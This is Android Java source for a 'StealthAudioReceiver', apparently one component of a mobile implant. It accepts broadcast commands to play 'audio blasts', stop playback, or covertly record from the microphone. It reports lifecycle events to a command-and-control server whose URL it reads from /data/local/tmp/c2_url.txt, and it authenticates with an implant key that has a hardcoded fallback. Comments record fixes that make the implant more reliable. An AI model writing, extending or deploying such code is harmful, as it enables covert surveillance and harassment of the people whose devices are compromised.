package com.stealthaudio;

import android.content.BroadcastReceiver;
import android.content.BroadcastReceiver.PendingResult;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.util.Date;

public class StealthAudioReceiver extends BroadcastReceiver {
    private static final String TAG = "StealthAudio";

    private static void logError(Context context, String msg, Throwable e) {
    String fullMsg = new Date() + " [StealthAudioReceiver] " + msg + (e != null ? ": " + e : "");
    Log.e(TAG, fullMsg, e);
    
    // Dynamically resolve to /data/user/0/com.stealthaudio/files/audio_errors.txt
    File logFile = new File(context.getFilesDir(), "audio_errors.txt");
    try (FileWriter writer = new FileWriter(logFile, true)) {
        writer.write(fullMsg + "\n");
    } catch (Exception ignored) {}
}

    private static String resolveBaseUrl() {
        String baseUrl = "http://127.0.0.1:8000";
        File urlFile = new File("/data/local/tmp/c2_url.txt");
        if (urlFile.exists()) {
            try (BufferedReader br = new BufferedReader(new FileReader(urlFile))) {
                String wsUrl = br.readLine();
                if (wsUrl != null && !wsUrl.isEmpty()) {
                    baseUrl = wsUrl
                        .replace("wss://", "https://")
                        .replace("ws://", "http://")
                        .replaceFirst("/ws$", "");
                }
            } catch (Exception ignored) {}
        }
        return baseUrl;
    }

    // FIX C-2: read implant key at runtime from reporter-written file instead of hardcoding.
    private static String resolveImplantKey() {
        File keyFile = new File("/data/local/tmp/implant.key");
        if (keyFile.exists()) {
            try (BufferedReader br = new BufferedReader(new FileReader(keyFile))) {
                String key = br.readLine();
                if (key != null && !key.trim().isEmpty()) return key.trim();
            } catch (Exception ignored) {}
        }
        return "DeltaForce2027"; // fallback if reporter hasn't written the file yet
    }

    private static void reportAudioEvent(Context context, final String deviceId, final int playType, final String endpoint) {
        if (deviceId == null || deviceId.isEmpty()) return;

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String baseUrl = resolveBaseUrl();
                    java.net.URL url = new java.net.URL(baseUrl + "/" + endpoint);
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setDoInput(true);
                    conn.setConnectTimeout(4000);
                    conn.setReadTimeout(4000);
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                    conn.setRequestProperty("Accept", "application/json");

                    String params = "device_id=" + java.net.URLEncoder.encode(deviceId, "UTF-8")
                        + "&implant_key=" + java.net.URLEncoder.encode(resolveImplantKey(), "UTF-8")
                        + "&play_audio=" + playType;

                    java.io.OutputStream os = conn.getOutputStream();
                    os.write(params.getBytes("UTF-8"));
                    os.flush();
                    os.close();
                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    logError(context, "Failed to report " + endpoint, e);
                }
            }
        }, "sa-report-" + endpoint).start();
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        
        // Fix: Call goAsync safely only after verifying valid execution pathways exist
        final PendingResult pendingResult = goAsync();
        try {
            String action = intent.getStringExtra("action");
            if (action == null) {
                logError(context, "Missing 'action' extra in intent", null);
                pendingResult.finish();
                return;
            }

            Context appContext = context.getApplicationContext();
            Intent serviceIntent = new Intent(appContext, StealthAudioService.class);

            if ("play".equals(action)) {
                int type = intent.getIntExtra("type", 1);
                // Fix: Boundary validate incoming integer signals
                if (type < 1 || type > 3) {
                    logError(context, "Invalid audio type extra parameter dropped: " + type, null);
                    pendingResult.finish();
                    return;
                }

                float volume = 1.0f;
                int loops = intent.getIntExtra("loops", 0);
                String volumeString = intent.getStringExtra("volume");
                if (volumeString != null) {
                    try {
                        volume = Float.parseFloat(volumeString);
                    } catch (Exception e) {
                        logError(context, "Invalid volume value: " + volumeString + ", using fallback default", e);
                    }
                }

                String deviceId = intent.getStringExtra("device_id");

                Log.i(TAG, "Starting audio blast via ForegroundService: type=" + type + " volume=" + volume + " loops=" + loops + " device=" + deviceId);

                serviceIntent.putExtra("action", "play");
                serviceIntent.putExtra("type", type);
                serviceIntent.putExtra("volume", volume);
                serviceIntent.putExtra("loops", loops);
                if (deviceId != null) serviceIntent.putExtra("device_id", deviceId);

                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        appContext.startForegroundService(serviceIntent);
                    } else {
                        appContext.startService(serviceIntent);
                    }
                    pendingResult.finish();
                } catch (Exception startException) {
                    logError(context, "Service start failed, falling back to direct playback", startException);
                    final Context playbackContext = appContext;
                    final int playbackType = type;
                    final float playbackVolume = volume;
                    final int playbackLoops = loops;
                    final String playbackDeviceId = deviceId;
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                reportAudioEvent(playbackContext, playbackDeviceId, playbackType, "audio_started");
                                StealthAudio.playSound(playbackContext, playbackType, playbackVolume, playbackLoops);
                            } catch (Exception playbackException) {
                                logError(playbackContext, "Direct playback failed", playbackException);
                            } finally {
                                reportAudioEvent(playbackContext, playbackDeviceId, playbackType, "audio_done");
                                pendingResult.finish();
                            }
                        }
                    }, "sa-direct-playback").start();
                }

            } else if ("stop".equals(action)) {
                String deviceId = intent.getStringExtra("device_id");
                Log.i(TAG, "Stopping audio blast via BroadcastReceiver device=" + deviceId);
                StealthAudio.stopPlayback();
                // FIX C-5: always report audio_done when a stop command arrives.
                // Previous logic was inverted — it only reported when nothing was playing.
                if (deviceId != null && !deviceId.isEmpty()) {
                    reportAudioEvent(appContext, deviceId, 0, "audio_done");
                }
                pendingResult.finish();

            } else if ("record".equals(action)) {
                int duration = intent.getIntExtra("duration", 30);
                // FIX R3-4: capture device_id so the service can report mic lifecycle events.
                final String recordDeviceId = intent.getStringExtra("device_id");
                Log.i(TAG, "Starting mic record via ForegroundService: duration=" + duration + "s");
                serviceIntent.putExtra("action", "record");
                serviceIntent.putExtra("duration", duration);
                // Forward device_id to the service so startMicRecord() can call reportAudioEvent().
                if (recordDeviceId != null) serviceIntent.putExtra("device_id", recordDeviceId);
                try {
                    appContext.startForegroundService(serviceIntent);
                    pendingResult.finish();
                } catch (Exception e) {
                    logError(context, "Mic record service start failed, falling back to direct capture", e);
                    final Context recordContext = appContext;
                    final int recordDuration = duration;
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                StealthMicRecorder.record(recordContext, recordDuration);
                            } catch (Exception recordException) {
                                logError(recordContext, "Direct mic capture failed", recordException);
                            } finally {
                                pendingResult.finish();
                            }
                        }
                    }, "sa-direct-record").start();
                }

            } else {
                logError(context, "Unknown action received: " + action, null);
                pendingResult.finish();
            }

        } catch (Exception e) {
            logError(context, "Crash in onReceive", e);
            try {
                pendingResult.finish();
            } catch (Exception ignored) {}
        }
    }
}